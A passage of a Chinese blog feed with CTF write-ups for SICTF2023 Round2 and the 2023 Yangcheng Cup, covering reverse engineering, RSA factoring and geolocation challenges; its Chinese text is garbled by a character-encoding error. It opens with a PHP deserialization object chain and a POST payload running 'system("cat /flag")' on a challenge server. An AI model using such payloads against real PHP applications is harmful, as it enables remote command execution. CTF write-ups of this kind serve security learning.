class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> phpserialize <span class="keyword">import</span> serialize</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">P</span>:</span><br><span class="line">    public_MyLover=<span class="string">&#x27;x&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>:</span><br><span class="line">    public_i=<span class="string">&#x27;1&#x27;</span></span><br><span class="line">    public_nogame=P()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    public_Aec=B()</span><br><span class="line">    public_girl=[<span class="string">&#x27;1&#x27;</span>]</span><br><span class="line">    public_boy=[<span class="string">&#x27;2&#x27;</span>]</span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>:</span><br><span class="line">    public_pop=A()</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(serialize(B()))</span><br><span class="line"></span><br><span class="line"><span class="comment"># O:1:&quot;B&quot;:1:&#123;s:3:&quot;pop&quot;;O:1:&quot;A&quot;:3:&#123;s:3:&quot;Aec&quot;;O:1:&quot;B&quot;:2:&#123;s:1:&quot;i&quot;;s:1:&quot;1&quot;;s:6:&quot;nogame&quot;;O:1:&quot;P&quot;:1:&#123;s:7:&quot;MyLover&quot;;s:1:&quot;x&quot;;&#125;&#125;s:3:&quot;boy&quot;;a:1:&#123;i:0;s:1:&quot;2&quot;;&#125;s:4:&quot;girl&quot;;a:1:&#123;i:0;s:1:&quot;1&quot;;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>POST <code>?A_B_C=O:1:&quot;B&quot;:1:&#123;s:3:&quot;pop&quot;;O:1:&quot;A&quot;:3:&#123;s:3:&quot;Aec&quot;;O:1:&quot;B&quot;:2:&#123;s:1:&quot;i&quot;;s:1:&quot;1&quot;;s:6:&quot;nogame&quot;;O:1:&quot;P&quot;:1:&#123;s:7:&quot;MyLover&quot;;s:1:&quot;x&quot;;&#125;&#125;s:3:&quot;boy&quot;;a:1:&#123;i:0;s:1:&quot;2&quot;;&#125;s:4:&quot;girl&quot;;a:1:&#123;i:0;s:1:&quot;1&quot;;&#125;&#125;&#125;</code></p><p><code>cmd=system(&quot;cat /flag&quot;);</code></p><p>â€‹    </p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="ç­¾åˆ°-PYC"><a href="#ç­¾åˆ°-PYC" class="headerlink" title="[ç­¾åˆ°]PYC"></a>[ç­¾åˆ°]PYC</h3><p>pycåç¼–è¯‘ï¼Œå¾—flagã€‚</p><p><code>SICTF&#123;07e278e7-9d66-4d90-88fc-8bd61e490616&#125;</code></p><p>â€‹    </p><h3 id="Myobject"><a href="#Myobject" class="headerlink" title="Myobject"></a>Myobject</h3><p>åŠ¨è°ƒï¼Œå‘ç°æ˜¯RC4ï¼Œkeyä¸º <code>SIFLAG</code>ï¼Œå¯†æ–‡ä¸º <code>3027D30E5A22CF47476B0BE58D53BA99C3850707011C7710FE889F</code>ã€‚</p><p>è§£å¯†RC4ï¼Œå¾—flagï¼š<code>SICTF&#123;wow_you_get_the_flag&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="chbase"><a href="#chbase" class="headerlink" title="chbase"></a>chbase</h3><p>æœç´¢å­—ç¬¦ä¸²å¾—</p><p>ç è¡¨ï¼š<code>ZYXWVUTSRQPONMLKJIHGFEDCBAabcdefghijklmnopqrstuvwxyz0123456789+/</code></p><p>å¯†æ–‡ï¼š<code>F0lWEVA7BmUzAGB0C2UuAU9hbnIpATEidDdnACQ9</code></p><p>base64è§£ç å¾—flagï¼š<code>SICTF&#123;base64_and_antidebugger&#125;</code></p><p>â€‹    </p><h3 id="ä¸ä¸€æ ·çš„base64"><a href="#ä¸ä¸€æ ·çš„base64" class="headerlink" title="ä¸ä¸€æ ·çš„base64"></a>ä¸ä¸€æ ·çš„base64</h3><p>pyinstxtractorè§£åŒ…å¾—åˆ°111.pycï¼Œåç¼–è¯‘å¾—åˆ°ï¼š</p><p><code>U0lDVEZ7OGUwZDM1OGQtOGI5ZC00ODY2LTliMDItNjc0OWIwN2FkMDlhfQAA</code></p><p>base64è§£ç å¾—flagï¼š<code>SICTF&#123;8e0d358d-8b9d-4866-9b02-6749b07ad09a&#125;</code></p><p>â€‹    </p><h3 id="javacode"><a href="#javacode" class="headerlink" title="javacode"></a>javacode</h3><p>JVMå­—èŠ‚ç ï¼Œå‚è€ƒ <a href="https://zhuanlan.zhihu.com/p/412472914">ä¸¤å¼ å›¾è®©ä½ å¿«é€Ÿè¯»æ‡‚JVMå­—èŠ‚ç æŒ‡ä»¤</a> ç†åŠ å¯†é€»è¾‘ï¼Œå·²çŸ¥keyå’Œå¯†æ–‡cï¼Œå…³é”®è¿ç®—ä¸ºï¼š</p><p><code>c[i] = (((m[i]^m[i+1])-k[i])^k[i])%256</code></p><p>è¿˜åŸï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">c = [<span class="number">148</span>,<span class="number">136</span>,<span class="number">151</span>,<span class="number">234</span>,<span class="number">177</span>,<span class="number">48</span>,<span class="number">226</span>,<span class="number">234</span>,<span class="number">214</span>,<span class="number">177</span>,<span class="number">168</span>,<span class="number">176</span>,<span class="number">151</span>,<span class="number">250</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">253</span>,<span class="number">52</span>,<span class="number">72</span>,<span class="number">176</span>,<span class="number">170</span>,<span class="number">140</span>,<span class="number">176</span>,<span class="number">236</span>,<span class="number">54</span>,<span class="number">231</span>,<span class="number">212</span>,<span class="number">237</span>,<span class="number">135</span>,<span class="number">151</span>,<span class="number">150</span>,<span class="number">135</span>,<span class="number">217</span>,<span class="number">231</span>,<span class="number">229</span>,<span class="number">32</span>,<span class="number">90</span>]</span><br><span class="line">k = <span class="built_in">list</span>(<span class="string">b&#x27;SICTF2023&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">dic = string.ascii_letters+string.digits+<span class="string">&#x27;_&#123;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">m = [<span class="number">83</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">        <span class="keyword">if</span> (((m[-<span class="number">1</span>]^j)-k[i%<span class="built_in">len</span>(k)])^k[i%<span class="built_in">len</span>(k)])%<span class="number">256</span> == c[i]:</span><br><span class="line">            m.append(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(m))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SICTF&#123;OMG_j@vac0de_1s_sO_interesting!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="ç­¾åˆ°-Shop"><a href="#ç­¾åˆ°-Shop" class="headerlink" title="[ç­¾åˆ°]Shop"></a>[ç­¾åˆ°]Shop</h3><p>æ•´æ•°æº¢å‡ºæ¼æ´ï¼Œè¾“å…¥-1å¾—flagã€‚</p><p>â€‹    </p><h2 id="FORENSICS"><a href="#FORENSICS" class="headerlink" title="FORENSICS"></a>FORENSICS</h2><h3 id="è´­ç‰©ä¹‹æ—…"><a href="#è´­ç‰©ä¹‹æ—…" class="headerlink" title="è´­ç‰©ä¹‹æ—…"></a>è´­ç‰©ä¹‹æ—…</h3><p>ç™¾åº¦è¯†å›¾+å…³é”®å­—æœç´¢ã€‚</p><p><code>SICTF&#123;åŒ—äº¬å¸‚_é¡ºä¹‰åŒº_æ–°é¡ºå—å¤§è¡—_åŒ—äº¬åè”é¡ºä¹‰é‡‘è¡—è´­ç‰©ä¸­å¿ƒ&#125;</code></p><p>â€‹    </p><h3 id="å¤©æ¡¥"><a href="#å¤©æ¡¥" class="headerlink" title="å¤©æ¡¥"></a>å¤©æ¡¥</h3><p>è¾¨è®¤å‡ºæ¢§æ¡æ ‘ï¼Œå†å…³é”®å­—æœç´¢åŸå¸‚ã€‚</p><p><code>SICTF&#123;é™•è¥¿çœè¥¿å®‰å¸‚ç¢‘æ—åŒºå‹è°Šè·¯&#125;</code></p><p>â€‹    </p><h3 id="ç¾å¥³å§å§O-o"><a href="#ç¾å¥³å§å§O-o" class="headerlink" title="ç¾å¥³å§å§O.o"></a>ç¾å¥³å§å§O.o</h3><p>ç™¾åº¦è¯†å›¾+å…³é”®å­—æœç´¢ã€‚</p><p><code>SICTF&#123;ç¦å»ºçœç¦å·å¸‚ä»“å±±åŒºçƒŸå°å±±å…¬å›­&#125;</code></p><p>â€‹    </p><h3 id="å®å¡”é•‡æ²³å¦–"><a href="#å®å¡”é•‡æ²³å¦–" class="headerlink" title="å®å¡”é•‡æ²³å¦–"></a>å®å¡”é•‡æ²³å¦–</h3><p>ç™¾åº¦è¯†å›¾+å…³é”®å­—æœç´¢ã€‚</p><p><code>SICTF&#123;å±±ä¸œçœæµå®å¸‚æ±¶ä¸Šå¿å¤ªå­çµè¸ªå¡”&#125;</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;â€‹    &lt;/p&gt;
&lt;p&gt;SICTF2023 #Round2 æ˜¯æ­å·ç”µå­ç§‘æŠ€å¤§å­¦ä¿¡æ¯å·¥ç¨‹å­¦é™¢å’Œå¹¿ä¸œæµ·æ´‹å¤§å­¦è”åˆä¸¾åŠçš„ç½‘ç»œå®‰å…¨èµ›ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Rank: 4&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&quot;MISC&quot;&gt;&lt;a href=&quot;#MISC&quot; c</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2023èµ›" scheme="https://lazzzaro.github.io/tags/2023%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>2023å¹´ç¾ŠåŸæ¯ç½‘ç»œå®‰å…¨å¤§èµ›</title>
    <link href="https://lazzzaro.github.io/2023/09/02/match-2023%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"/>
    <id>https://lazzzaro.github.io/2023/09/02/match-2023%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</id>
    <published>2023-09-02T15:19:34.000Z</published>
    <updated>2023-09-03T02:23:43.500Z</updated>
    
    <content type="html"><![CDATA[<p>â€‹    </p><p>ç«èµ›æ—¶é—´</p><p>2023-09-02 09:00:00~2023-09-03 09:00:00</p><p>ç«èµ›ç®€ä»‹</p><p>ç›®å‰æˆ‘å›½ç½‘æ°‘è§„æ¨¡å·²çªç ´9äº¿ï¼Œæˆä¸ºåå‰¯å…¶å®çš„ç½‘ç»œå¤§å›½ï¼Œä½†æˆ‘å›½ä¸ç½‘ç»œå¼ºå›½ç›¸æ¯”è¿˜æœ‰ä¸€å®šè·ç¦»ã€‚ä¹ è¿‘å¹³æ€»ä¹¦è®°æŒ‡å‡ºï¼šè¦å»ºç«‹é«˜ç´ è´¨ç½‘ç»œå®‰å…¨å’Œä¿¡æ¯åŒ–äººæ‰é˜Ÿä¼ï¼Œå°†æˆ‘å›½å»ºè®¾æˆç½‘ç»œå¼ºå›½ã€‚å»ºè®¾ç½‘ç»œå¼ºå›½éœ€è¦é«˜ç´ è´¨çš„ç½‘ç»œå®‰å…¨å’Œä¿¡æ¯åŒ–äººæ‰é˜Ÿä¼ã€‚ç½‘ç»œå®‰å…¨äººæ‰æ˜¯å›½å®¶ç½‘ç»œå®‰å…¨å»ºè®¾çš„æ ¸å¿ƒèµ„æºï¼Œå…¶æ•°é‡ã€è´¨é‡å’Œç»“æ„æ˜¯è¡¡é‡å›½å®¶ç½‘ç»œå®‰å…¨è½¯å®åŠ›å’Œç«äº‰åŠ›çš„é‡è¦æ ‡å¿—ã€‚ ä¸ºç§¯æå“åº”å›½å®¶ç½‘ç»œå¼ºå›½å»ºè®¾å¯¹ç½‘ç»œå®‰å…¨äººæ‰çš„éœ€æ±‚ï¼Œæå‡äººæ°‘çš„ç½‘ç»œå®‰å…¨çŸ¥è¯†æ°´å¹³å’Œå®è·µåŠ›ï¼Œç‰¹ä¸¾åŠ2023å¹´â€œç¾ŠåŸæ¯â€ç½‘ç»œå®‰å…¨å¤§èµ›ã€‚</p><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="EZ-misc"><a href="#EZ-misc" class="headerlink" title="EZ_misc"></a>EZ_misc</h3><blockquote><p>ä¸€é“ç®€å•çš„miscæ..</p></blockquote><p>16è¿›åˆ¶æŸ¥çœ‹ï¼Œæœ«å°¾ä¿®æ”¹ <code>504b0403</code> ä¸º <code>504b0304</code> åæå–å‡ºzipæ–‡ä»¶ï¼Œå¾—åˆ°ä¸€ä¸²å¯†æ–‡ <code>vzbtrvplnnvphsqkxsiqibroou</code>ã€‚</p><p>æ ¹æ®å›¾ç‰‡åGronså’Œå‹ç¼©åŒ…å†…æ–‡ä»¶åfeldï¼Œç»„åˆå¾—åˆ°Gronsfeldä¸ºä¸€ç§å¯†ç ï¼Œçˆ†ç ´å¯†é’¥å¾—åˆ°æç¤ºï¼š<code>try to think the s nipping tools</code>ï¼Œä¸ºWin10/11æˆªå›¾å·¥å…·æ¼æ´aCropalypseï¼ˆCVE-2023-28303ï¼‰ã€‚</p><p>åˆ©ç”¨<a href="https://github.com/frankthetank-music/Acropalypse-Multi-Tool">Acropalypse Multi Toolå·¥å…·</a>ä¿®å¤pngå®½é«˜ï¼Œè¿˜åŸå¾—åˆ°flagï¼š</p><p><img src="/2023/09/02/match-2023%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/image-20230903014924226.png" alt="image-20230903014924226"></p><p>â€‹    </p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="Danger-RSA"><a href="#Danger-RSA" class="headerlink" title="Danger_RSA"></a>Danger_RSA</h3><blockquote><p>çœ‹ä¼¼ç®€å•çš„rsa</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_key</span>(<span class="params">a, nbit</span>):</span><br><span class="line">    <span class="keyword">assert</span> a &gt;= <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        X = getRandomInteger(nbit // a)</span><br><span class="line">        s = getRandomRange(<span class="built_in">pow</span>(<span class="number">2</span>, a ** <span class="number">2</span> - a + <span class="number">4</span>), <span class="built_in">pow</span>(<span class="number">2</span>, a ** <span class="number">2</span> - a + <span class="number">5</span>))</span><br><span class="line">        p = X ** a + s</span><br><span class="line">        <span class="keyword">if</span> isPrime(p):</span><br><span class="line">            <span class="keyword">return</span> (p, s)</span><br><span class="line"></span><br><span class="line">p, s = get_key(a, <span class="number">1024</span>)</span><br><span class="line">q, t = get_key(a, <span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">N = p * q</span><br><span class="line">e = s * t</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, N)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;N =&quot;</span>, N)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e =&quot;</span>, e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>, c)</span><br><span class="line"><span class="comment"># N = 20289788565671012003324307131062103060859990244423187333725116068731043744218295859587498278382150779775620675092152011336913225797849717782573829179765649320271927359983554162082141908877255319715400550981462988869084618816967398571437725114356308935833701495015311197958172878812521403732038749414005661189594761246154666465178024563227666440066723650451362032162000998737626370987794816660694178305939474922064726534186386488052827919792122844587807300048430756990391177266977583227470089929347969731703368720788359127837289988944365786283419724178187242169399457608505627145016468888402441344333481249304670223</span></span><br><span class="line"><span class="comment"># e = 11079917583</span></span><br><span class="line"><span class="comment"># c = 13354219204055754230025847310134936965811370208880054443449019813095522768684299807719787421318648141224402269593016895821181312342830493800652737679627324687428327297369122017160142465940412477792023917546122283870042482432790385644640286392037986185997262289003477817675380787176650410819568815448960281666117602590863047680652856789877783422272330706693947399620261349458556870056095723068536573904350085124198592111773470010262148170379730937529246069218004969402885134027857991552224816835834207152308645148250837667184968030600819179396545349582556181916861808402629154688779221034610013350165801919342549766</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></blockquote><p>$N$ ä¸º2038ä½ï¼Œ$p,q$ è‡³å°‘ä¸º1024ä½ï¼Œä¸”ç”Ÿæˆå‡½æ•° <code>get_key()</code> çš„ $p=X^a+s$ æœ‰ $X^a \gt\gt s$ï¼Œä¸” $e$ ä¸º34ä½ï¼Œ$s&lt;e$ï¼Œæ•… $a$ å€¼ä¸ä¼šå¤ªå¤§ï¼Œå°è¯•çˆ†ç ´ $a$ å€¼ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">N = <span class="number">20289788565671012003324307131062103060859990244423187333725116068731043744218295859587498278382150779775620675092152011336913225797849717782573829179765649320271927359983554162082141908877255319715400550981462988869084618816967398571437725114356308935833701495015311197958172878812521403732038749414005661189594761246154666465178024563227666440066723650451362032162000998737626370987794816660694178305939474922064726534186386488052827919792122844587807300048430756990391177266977583227470089929347969731703368720788359127837289988944365786283419724178187242169399457608505627145016468888402441344333481249304670223</span></span><br><span class="line">e = <span class="number">11079917583</span></span><br><span class="line">c = <span class="number">13354219204055754230025847310134936965811370208880054443449019813095522768684299807719787421318648141224402269593016895821181312342830493800652737679627324687428327297369122017160142465940412477792023917546122283870042482432790385644640286392037986185997262289003477817675380787176650410819568815448960281666117602590863047680652856789877783422272330706693947399620261349458556870056095723068536573904350085124198592111773470010262148170379730937529246069218004969402885134027857991552224816835834207152308645148250837667184968030600819179396545349582556181916861808402629154688779221034610013350165801919342549766</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_key</span>(<span class="params">a, nbit</span>):</span><br><span class="line">    <span class="keyword">assert</span> a &gt;= <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        X = getRandomInteger(nbit // a)</span><br><span class="line">        s = <span class="built_in">pow</span>(<span class="number">2</span>, a ** <span class="number">2</span> - a + <span class="number">5</span>) <span class="comment"># å–å¯èƒ½çš„æœ€å¤§å€¼</span></span><br><span class="line">        p = X ** a + s</span><br><span class="line">        <span class="keyword">if</span> isPrime(p):</span><br><span class="line">            <span class="keyword">return</span> (p, s)</span><br><span class="line">     </span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">20</span>):</span><br><span class="line">    p, s = get_key(a,<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">if</span> s.bit_length() &lt; <span class="number">34</span>: <span class="comment"># s &lt; e</span></span><br><span class="line">        <span class="built_in">print</span>(a, p.bit_length(), s.bit_length())</span><br><span class="line">        </span><br><span class="line"><span class="comment"># 2 1021 8</span></span><br><span class="line"><span class="comment"># 3 1012 12</span></span><br><span class="line"><span class="comment"># 4 1020 18</span></span><br></pre></td></tr></table></figure><p>$a=4$ æ—¶æ»¡è¶³ $e=s \cdot t$ çš„ä½æ•°æ¡ä»¶ï¼Œæœ‰ $s \in [2^{a^2-a+4},2^{a^2-a+5})=[65536,131072)$ã€‚</p><p>åˆ†è§£ $e$ï¼Œå°è¯•å…¶å„å› å­ï¼Œæ±‚ $s,t$ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">4</span></span><br><span class="line"><span class="comment"># s ~ (65536,131072)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># e = 3 Â· 7^2 Â· 19 Â· 691 Â· 5741</span></span><br><span class="line">ed = [<span class="number">1</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">49</span>, <span class="number">57</span>, <span class="number">133</span>, <span class="number">147</span>, <span class="number">399</span>, <span class="number">691</span>, <span class="number">931</span>, <span class="number">2073</span>, <span class="number">2793</span>, <span class="number">4837</span>, <span class="number">5741</span>, <span class="number">13129</span>, <span class="number">14511</span>, <span class="number">17223</span>, <span class="number">33859</span>, <span class="number">39387</span>, <span class="number">40187</span>, <span class="number">91903</span>, <span class="number">101577</span>, <span class="number">109079</span>, <span class="number">120561</span>, <span class="number">275709</span>, <span class="number">281309</span>, <span class="number">327237</span>, <span class="number">643321</span>, <span class="number">763553</span>, <span class="number">843927</span>, <span class="number">1929963</span>, <span class="number">2290659</span>, <span class="number">3967031</span>, <span class="number">5344871</span>, <span class="number">11901093</span>, <span class="number">16034613</span>, <span class="number">27769217</span>, <span class="number">75373589</span>, <span class="number">83307651</span>, <span class="number">194384519</span>, <span class="number">226120767</span>, <span class="number">527615123</span>, <span class="number">583153557</span>, <span class="number">1582845369</span>, <span class="number">3693305861</span>, <span class="number">11079917583</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> ed:</span><br><span class="line">    <span class="keyword">if</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65536</span>,<span class="number">131072</span>):</span><br><span class="line">        s = k</span><br><span class="line">        t = e // s</span><br><span class="line">        <span class="keyword">if</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65536</span>,<span class="number">131072</span>) <span class="keyword">and</span> t &gt; s:</span><br><span class="line">            <span class="built_in">print</span>((s,t))</span><br><span class="line">            </span><br><span class="line"><span class="comment"># (91903, 120561)</span></span><br><span class="line"><span class="comment"># (101577, 109079)</span></span><br></pre></td></tr></table></figure><p>å¸¦å…¥æœ‰ $p=X_1^4+s,q=X_2^4+t$ï¼Œåˆ $X_1^4 \gt\gt s,X_2^4 \gt\gt t$ï¼Œæœ‰ $(X_1X_2)^4 \approx N$ï¼Œå³ $X_1X_2= \lfloor\sqrt[4]{N}\rfloor$ã€‚ç»“åˆ $N=pq=(X_1^4+s)(X_2^4+t)$ï¼Œè§£ $X_1,X_2$ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">st = [(<span class="number">91903</span>, <span class="number">120561</span>), (<span class="number">101577</span>, <span class="number">109079</span>)]</span><br><span class="line"></span><br><span class="line">N = <span class="number">20289788565671012003324307131062103060859990244423187333725116068731043744218295859587498278382150779775620675092152011336913225797849717782573829179765649320271927359983554162082141908877255319715400550981462988869084618816967398571437725114356308935833701495015311197958172878812521403732038749414005661189594761246154666465178024563227666440066723650451362032162000998737626370987794816660694178305939474922064726534186386488052827919792122844587807300048430756990391177266977583227470089929347969731703368720788359127837289988944365786283419724178187242169399457608505627145016468888402441344333481249304670223</span></span><br><span class="line">e = <span class="number">11079917583</span></span><br><span class="line">c = <span class="number">13354219204055754230025847310134936965811370208880054443449019813095522768684299807719787421318648141224402269593016895821181312342830493800652737679627324687428327297369122017160142465940412477792023917546122283870042482432790385644640286392037986185997262289003477817675380787176650410819568815448960281666117602590863047680652856789877783422272330706693947399620261349458556870056095723068536573904350085124198592111773470010262148170379730937529246069218004969402885134027857991552224816835834207152308645148250837667184968030600819179396545349582556181916861808402629154688779221034610013350165801919342549766</span></span><br><span class="line">s = <span class="built_in">int</span>(st[<span class="number">0</span>][<span class="number">0</span>]) <span class="comment"># å¦ä¸€ç»„æ— è§£</span></span><br><span class="line">t = <span class="built_in">int</span>(st[<span class="number">0</span>][<span class="number">1</span>])</span><br><span class="line">y = <span class="built_in">int</span>(gmpy2.iroot(N,<span class="number">4</span>)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">P.&lt;x1,x2&gt; = PolynomialRing(ZZ)</span><br><span class="line">f1 = (x1^<span class="number">4</span>+s)*(x2^<span class="number">4</span>+t)-N</span><br><span class="line">f2 = x1*x2-y</span><br><span class="line">g = f1.resultant(f2, x2)</span><br><span class="line">X2 = g.univariate_polynomial().roots()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">X1 = y//X2</span><br><span class="line"><span class="built_in">print</span>((X1,X2))</span><br><span class="line"></span><br><span class="line">p = X1^<span class="number">4</span>+s</span><br><span class="line">q = X2^<span class="number">4</span>+t</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> is_prime(p):</span><br><span class="line">    p = X2^<span class="number">4</span>+s</span><br><span class="line">    q = X1^<span class="number">4</span>+t</span><br><span class="line"><span class="built_in">print</span>(is_prime(p))</span><br><span class="line"><span class="built_in">print</span>(is_prime(q))</span><br><span class="line"></span><br><span class="line"><span class="comment"># AMM</span></span><br><span class="line"><span class="keyword">for</span> mp <span class="keyword">in</span> GF(p)(c).nth_root(e, <span class="built_in">all</span>=<span class="literal">True</span>):</span><br><span class="line">    <span class="keyword">for</span> mq <span class="keyword">in</span> GF(q)(c).nth_root(e, <span class="built_in">all</span>=<span class="literal">True</span>):</span><br><span class="line">        m = crt([ZZ(mp), ZZ(mq)], [p, q])</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res = <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])</span><br><span class="line">            <span class="keyword">if</span> res.isascii():</span><br><span class="line">                <span class="built_in">print</span>(res)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        </span><br><span class="line"><span class="comment"># b&#x27;DASCTF&#123;C0nsTruct!n9_Techn1qUe2_f0r_RSA_Pr1me_EnC2ypt10N&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="Easy-3L"><a 